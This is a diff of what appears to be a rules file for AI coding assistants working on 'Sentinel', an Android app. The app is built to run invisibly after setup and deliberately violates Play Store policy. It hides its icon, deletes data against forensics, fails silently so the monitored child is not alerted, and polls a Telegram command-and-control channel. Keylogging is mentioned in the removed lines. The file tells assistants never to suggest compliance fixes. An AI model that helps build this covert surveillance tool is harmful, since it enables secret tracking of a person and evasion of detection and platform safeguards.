@@ -13,35 +13,36 @@ This document defines the context, rules, and architectural constraints for AI a
 *   **Build System**: Gradle functionality (Kotlin DSL recommended).
 *   **Architecture**: MVVM (Model-View-ViewModel) with Clean Architecture principles.
 *   **Database**: Room (SQLite) with Write-Ahead Logging (WAL).
-*   **Networking**: OkHttp (Long-polling implementation).
-*   **Cryptography**: `javax.crypto` (AES-GCM) + `java.security` (RSA-OAEP).
+*   **Networking**: OkHttp (Bot API Client).
+*   **Scheduling**: WorkManager (Periodic 15-min cycles).
+*   **Stealth**: `PackageManager` manipulation (Icon logic) + `SecureDelete` (Forensics).
 
 ## Critical Constraints (Directives)
 1.  **No Google Play Compliance**: We deliberately violate Play Store policies regarding `AccessibilityService` and `REQUEST_IGNORE_BATTERY_OPTIMIZATIONS`. Do **NOT** suggest removing features to comply with store rules.
 2.  **Stealth First**: Any UI element added must have a purpose for the *setup phase* only. After setup, the app must be invisible (Headless).
-3.  **Persistence is Paramount**: The app must survive aggressive OS memory killing. Use `START_STICKY`, `ForegroundService`, and `WorkManager` aggressively.
-4.  **Zero-Knowledge**: Never transmit plaintext logs. Always encrypt locally before network transmission.
+3.  **Persistence is Paramount**: The app must survive aggressive OS memory killing. Use `WorkManager` (Periodic) as the primary heartbeat.
+4.  **Zero-Knowledge**: Never transmit plaintext logs if avoidable. (Phase 4 currently relies on HTTPS transport security). always verify secure deletion.
 
 ## Code Style & Standards
 *   **Language**: English only for code, comments, and documentation.
-*   **Logs**: Use structured logging. **NEVER** log sensitive captured user data (keystrokes) to Logcat in Release builds.
-*   **Error Handling**: Fail silently in background services to avoid alerting the user (child). Reschedule, don't crash.
+*   **Logs**: Use structured logging. **NEVER** log sensitive captured user data to Logcat in Release builds.
+*   **Error Handling**: Fail silently in background workers. Reschedule (`Result.retry()`), don't crash.
 
 ## Development Workflow
 *   **Branching**: `master` is the source of truth. Feature branches should be merged via PR (if applicable) or direct push for solo dev.
-*   **Commits**: Semantic messages (e.g., `feat: add keylogger`, `fix: stealth mode crash`).
+*   **Commits**: Semantic messages (e.g., `feat: add stealth manager`, `fix: worker constraints`).
 *   **Deployment**: GitHub Actions builds the Release APK.
 
 ## File Structure Overview
 ```text
 app/src/main/
 ├── java/com/zero/sentinel/
-│   ├── services/      # SentinelService (FGS, C2 Loop)
+│   ├── workers/       # C2Worker (Polling, Uploads) - Replaces FGS
 │   ├── receivers/     # BootReceiver
-│   ├── telemetry/     # SentinelNotificationListener (Pivot)
-│   ├── ui/            # MainActivity (Config), StealthAlias
+│   ├── telemetry/     # SentinelNotificationListener (Data Source)
+│   ├── ui/            # MainActivity (Config)
 │   ├── data/          # Room DB, Repository, EncryptedPrefsManager
-│   ├── crypto/        # Encryption Utilities
+│   ├── utils/         # StealthManager, SecureDelete
 │   └── network/       # TelegramClient, CommandProcessor
 ├── res/               # Android Resources (Layouts, Strings)
 └── AndroidManifest.xml
